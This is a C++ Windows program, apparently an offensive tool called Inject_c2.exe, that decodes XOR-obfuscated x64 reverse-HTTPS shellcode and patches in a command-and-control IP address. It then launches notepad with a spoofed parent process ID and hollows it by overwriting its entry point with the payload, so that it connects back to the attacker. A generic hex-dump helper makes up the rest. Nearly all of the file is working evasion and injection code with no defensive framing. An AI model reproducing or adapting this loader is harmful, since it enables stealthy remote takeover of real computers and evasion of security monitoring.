#include <windows.h>
#include <winbase.h>
#include <stdio.h>
#include <cstring>
#include <cstdlib>
#include <winternl.h>

typedef unsigned __int64 QWORD;
void HexDump ( const char * desc, const void * addr, const int len, int perLine);

//Returns the last Win32 error, in string format. Returns an empty string if there is no error.
char* GetLastErrorAsString()
{
    //Get the error message ID, if any.
    DWORD errorMessageID = ::GetLastError();
    if(errorMessageID == 0) {
        return NULL;
    }
    
    LPSTR messageBuffer = NULL;

    //Ask Win32 to give us the string version of that message ID.
    //The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                 NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
    
    return messageBuffer;;
}

int main(int args, char *argc[])
{
    char c2_ip[16] = {};
    int ppid = 4752;

    if (args != 3)
    {
        printf("Usage:: Inject_c2.exe <c2 ip> <parent id>\n");
        memcpy(c2_ip, "192.168.49.115",15);
    }
    else
    {
        memcpy(c2_ip, argc[1], 15);
        ppid = atoi(argc[2]);
        
    }
    printf("C2 IP = %s\n", c2_ip );

//          Begin Shellcode deobfuscation

    // Xor'd values of a Reverse HTTPS connection on port 443 for x64. IP address has been zeroed out and replaced below after decodeing
    char encoded[] =  "\xc9\xd1\x62\xd1\x69\x09\xf9\x99\xe1\x35\xd8\xb0\x74\xc9\xb3\x64\xd1\xd0\xe7\xcf\x84\x7d\x12\xb3\x55\xd1\x6a\x67\x81\xa9\xbe\xcb\xc1\x7d\x96\x56\x7f\xd3\xac\x04\x50\xa9\xbe\xeb\xb1\x7d\xa8\x21\x99\xa5\x80\x49\x9b\xcd\x15\xd8\x20\xfc\x94\xa0\x34\x58\x03\xd8\xcb\xa9\xbe\xcb\xc1\xbe\xdb\xdd\x74\xc8\xa9\x34\x49\x87\xb4\xe1\xf9\x3e\x9b\xee\xb0\xeb\xe1\x35\x99\x6a\xb5\x11\xe1\x35\x99\xa9\xb0\x59\x95\x52\xd1\xe0\xe5\x12\xa9\x2d\xdd\x6a\x75\xb9\xb1\x7c\x98\x31\xd6\xcf\xa9\xca\x50\xac\x04\x50\xa0\xbe\xad\x69\x7d\x98\x37\x7d\xa8\x21\x74\x58\x28\x38\x35\xa0\x34\x58\xd9\xd5\xec\x10\x79\x9a\xad\x11\x91\xa4\x0c\x48\x94\xed\xc1\xa5\xbe\xd9\xc5\x7c\x98\x31\x53\xd8\x6a\x39\xd1\xa5\xbe\xd9\xfd\x7c\x98\x31\x74\x12\xe5\xbd\xd8\xb9\x74\xc1\xa9\x34\x49\xbf\x6c\xc3\xa0\x6d\xd8\xb8\x74\xc3\xa9\xb6\x75\xc1\x74\xcb\x1e\xd5\xc1\xa0\x6c\xc3\xa9\xbe\x8b\x08\x7e\x66\x1e\xca\xc4\xa9\x04\x42\xb2\x7c\x27\x96\x5c\xf7\x88\x5b\xfc\x95\x35\xd8\xb7\x7d\x10\x00\x7c\x5e\x23\x79\xee\xc7\x32\x66\x34\x66\xca\xa9\xbc\x78\xb2\x6f\xd4\xd0\xf5\xd4\xd0\xfc\xca\xb2\x7c\x23\xdb\x63\xe0\x46\x35\x99\xe1\x35\x66\x34\xdd\x89\xe1\x35\x99\xe1\x35\x99\xe1\x35\x99\xe1\x35\x99\xe1\x35\x99\xe1\x35\x99\xe1\x6f\xd1\x68\xf4\xd0\x26\xf5\x22\xe0\x35\x99\xac\x04\x50\xb2\x66\xf3\xe2\x66\xd0\x5b\x62\x10\x7e\xf3\x99\xe1\x35\x99\x1e\xe0\x71\x5d\x35\x99\xe1\x1a\xab\xac\x76\xc8\xbe\x60\xee\x97\x7f\xcb\xb3\x6a\xe1\xd2\x02\xdf\xa9\x47\xc1\xa3\x73\xee\xd7\x02\xdb\xd5\x6c\xf6\xa4\x57\xa8\x99\x72\xd0\x82\x7e\xd3\xa0\x5a\xdf\x8f\x70\xa1\xd4\x51\xf4\x8e\x5c\xd3\xd5\x74\xca\xd0\x5f\xec\x8c\x65\xea\xab\x51\xd1\x87\x46\xd7\x91\x60\xf2\xd2\x4c\xa9\x97\x65\xee\xd7\x5c\xb4\xab\x50\xd6\x86\x5c\xd3\x93\x44\xa0\x94\x71\xd4\x93\x43\xdc\xa8\x73\xb4\x8a\x7f\xe9\xa9\x4d\xc6\xa4\x03\xe3\x8f\x46\xfa\xaf\x5c\xdd\xac\x65\xd5\x8d\x7a\xae\xa8\x07\xf7\xac\x6c\xc3\x93\x7d\xed\xb8\x6c\xe9\xd3\x7e\xeb\xa5\x0d\xcf\xa0\x06\xdb\xa5\x0d\xc0\x83\x53\xc9\xa3\x61\xd1\xd0\x58\xe9\x82\x76\xf2\x8d\x5c\xf5\xa5\x66\xd4\xa6\x58\xc8\xa2\x6f\xce\xa8\x6c\xd2\xa5\x4c\xd1\x98\x6c\xed\xd9\x79\xe0\xa9\x47\xdd\xa8\x4c\xcb\x8d\x6f\xed\x8a\x77\x99\xa9\xbc\x58\xb2\x6f\xd8\xb9\x78\xa8\x28\x66\xd1\x59\x35\xab\x49\xb1\x99\xe1\x35\x99\xb1\x66\xca\xa8\xf2\x5b\x0a\x60\xb7\xda\xca\x4c\xa9\xbc\x5f\x8b\x3f\xc6\xa9\xbc\x68\x8b\x2a\xc3\xb3\x5d\x19\xd2\x35\x99\xa8\xbc\x79\x8b\x31\xd8\xb8\x7c\x23\x94\x73\x07\x67\x35\x99\xe1\x35\x66\x34\x78\xa8\x21\x66\xc3\xa9\xbc\x68\xac\x04\x50\xac\x04\x50\xb2\x66\xd0\x26\xf7\xb4\xe7\x2d\xe2\x1e\xe0\x1c\x21\x40\x86\xa9\xf2\x58\x69\x26\x99\xe1\x7c\x23\xa5\xc5\xac\x01\x35\x99\xe1\x35\x66\x34\x7d\x66\x2e\x41\x9b\x0a\x9f\x71\xb4\x35\x99\xe1\x66\xc0\x8b\x75\xc3\xa8\xbc\x48\x20\xd7\x89\xa8\xf2\x59\xe1\x25\x99\xe1\x7c\x23\xb9\x91\xca\x04\x35\x99\xe1\x35\x66\x34\x7d\x0a\xb2\x66\xd1\x68\xd2\xd1\x68\xc4\xd1\x68\xef\xd0\x26\xf5\x99\xc1\x35\x99\xa8\xbc\x60\xa8\x8f\x8b\x77\xbc\x7b\xe1\x35\x99\xe1\xca\x4c\xa9\xb6\x5d\xc1\xb0\x59\x95\x87\xff\x6a\x32\xd1\xe0\xf6\x1c\x21\x40\x4b\xb9\xf6\xc1\x8b\x35\xc0\xa8\xf2\x5b\x11\x80\x3b\xb7\xca\x4c";
    int encoded_size = sizeof(encoded);
    char xor1[] = "\x35\x99\xe1";
    int xor_size = 3;
        
    char *buf = (char*)malloc(encoded_size);
    for(int i = 0; i < encoded_size; i++)
    {
        buf[i] = encoded[i]^xor1[i%xor_size];
    }
    int base_offset = 0x113;
    for (int offset = 0x0; offset < strlen(c2_ip); offset = offset + 1)
    {
        buf[base_offset + offset] = c2_ip[offset];
    }
//    End Shellcode deobfuscation


    // PPID Spoofing
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	
	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, ppid); // Explorer is where notepad is normally run under

	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi);
    // PPID Spoofing
    
    // Process Hollowing
    PROCESS_BASIC_INFORMATION bi = {};
    memset(&bi, 0, sizeof(PROCESS_BASIC_INFORMATION));
    HANDLE hProcess = pi.hProcess;
    PULONG tmp = 0;
    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &bi, sizeof(PROCESS_BASIC_INFORMATION), tmp);
    PEB *peb = bi.PebBaseAddress;
    printf("PEB address(remote): %p\n", peb);
    PVOID ptrToImageBase = (PVOID)(((char*)peb)+0x10);
    printf("ImageBaseAddress(remote): 0x%llx\n", ptrToImageBase);
    QWORD addrBuf = 0;
    SIZE_T tmp2 = 0;
    if(ReadProcessMemory(hProcess, ptrToImageBase, &addrBuf, 8, &tmp2) == 0)
    {
        char* errorStr = GetLastErrorAsString();    
        printf("Error'd out: %s\n", errorStr);
        free(errorStr);
        exit(1);
    }

    printf("Remote Image Address(remote): 0x%llx\n", addrBuf);
    char data[0x200] = {0};
    if(ReadProcessMemory(hProcess, (PVOID)addrBuf, data, 0x200, &tmp2) == 0)
    {
        char* errorStr = GetLastErrorAsString();    
        printf("Error'd out: %s\n", errorStr);
        free(errorStr);
        exit(1);
    }
    QWORD *ppeHdrOffset =(QWORD*)(data+0x3c);
    DWORD peHdrOffset = *ppeHdrOffset;
    printf("peoffset(remote): 0x%llx\n", peHdrOffset);
    QWORD *ptrEntryOffset =(QWORD*)(data+peHdrOffset+0x28);
    DWORD entryOffset = *ptrEntryOffset;
    printf("entryOffset(remote): 0x%llx\n", entryOffset);
    QWORD *ptrEntryPoint =(QWORD*)(addrBuf+entryOffset);
    printf("Writting memory too(remote): 0x%llx\n", ptrEntryPoint);
    if( WriteProcessMemory(hProcess, ptrEntryPoint, buf, encoded_size, &tmp2) == 0)
    {
        char* errorStr = GetLastErrorAsString();    
        printf("Error'd out: %s\n", errorStr);
        free(errorStr);
        exit(1);
    }
    ResumeThread(pi.hThread);
}

// Usage:
//     HexDump(desc, addr, len, perLine);
//         desc:    if non-NULL, printed as a description before hex dump.
//         addr:    the address to start dumping from.
//         len:     the number of bytes to dump.
//         perLine: number of bytes on each output line.

void HexDump (
    const char * desc,
    const void * addr,
    const int len,
    int perLine
) {
    // Silently ignore silly per-line values.

    if (perLine < 4 || perLine > 64) perLine = 16;

    int i;
    unsigned char buff[perLine+1];
    const unsigned char * pc = (const unsigned char *)addr;

    // Output description if given.

    if (desc != NULL) printf ("%s:\n", desc);

    // Length checks.

    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        printf("  NEGATIVE LENGTH: %d\n", len);
        return;
    }

    // Process every byte in the data.

    for (i = 0; i < len; i++) {
        // Multiple of perLine means new or first line (with line offset).

        if ((i % perLine) == 0) {
            // Only print previous-line ASCII buffer for lines beyond first.

            if (i != 0) printf ("  %s\n", buff);

            // Output the offset of current line.

            printf ("  %04x ", i);
        }

        // Now the hex code for the specific character.

        printf (" %02x", pc[i]);

        // And buffer a printable ASCII character for later.

        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) // isprint() may be better.
            buff[i % perLine] = '.';
        else
            buff[i % perLine] = pc[i];
        buff[(i % perLine) + 1] = '\0';
    }

    // Pad out last line if not exactly perLine characters.

    while ((i % perLine) != 0) {
        printf ("   ");
        i++;
    }

    // And print the final ASCII buffer.

    printf ("  %s\n", buff);
}
